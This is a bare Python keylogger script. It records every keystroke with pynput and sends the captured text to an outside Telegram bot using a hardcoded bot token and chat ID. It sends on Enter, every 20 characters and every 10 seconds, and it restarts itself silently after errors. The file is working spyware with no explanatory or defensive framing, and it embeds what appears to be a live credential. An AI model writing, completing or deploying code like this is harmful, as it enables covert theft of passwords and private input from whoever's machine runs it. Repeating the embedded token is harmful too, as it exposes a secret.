import requests
from pynput.keyboard import Key, Listener
import time
import threading
import os
import sys

TOKEN = "8985026239:AAFluyNrfR6x6tU6YnmzSdDA1fOtMiHAeYg"
CHAT_ID = "-1004356233671"

buffer = ""

def send_to_telegram(text):
    if text.strip():
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text}
        try:
            requests.post(url, data=payload, timeout=10)
        except:
            pass

def on_press(key):
    global buffer
    try:
        buffer += key.char
    except AttributeError:
        vk = getattr(key, 'vk', None)
        numpad_map = {
            96: '0', 97: '1', 98: '2', 99: '3', 100: '4', 
            101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
            110: '.', 109: '*', 107: '-', 111: '/', 108: ',',
            13: '[ENTER]' 
        }
        if vk in numpad_map:
            val = numpad_map[vk]
            if val == '[ENTER]':
                send_to_telegram(buffer + " [ENTER]")
                buffer = ""
            else:
                buffer += val
        elif key == Key.space:
            buffer += " "
        elif key == Key.enter:
            send_to_telegram(buffer + " [ENTER]")
            buffer = ""
        elif key == Key.backspace:
            buffer = buffer[:-1]
        elif key == Key.tab:
            buffer += " [TAB] "
        elif key in [Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.alt, Key.alt_gr]:
            pass 
        else:
            key_name = str(key).replace("Key.", "")
            buffer += f" [{key_name}] "

    if len(buffer) >= 20:
        send_to_telegram(buffer)
        buffer = ""

def auto_send():
    global buffer
    while True:
        time.sleep(10) 
        if buffer:
            send_to_telegram(buffer + " [AUTO-SEND]")
            buffer = ""

threading.Thread(target=auto_send, daemon=True).start()

while True:
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception:
        time.sleep(10)
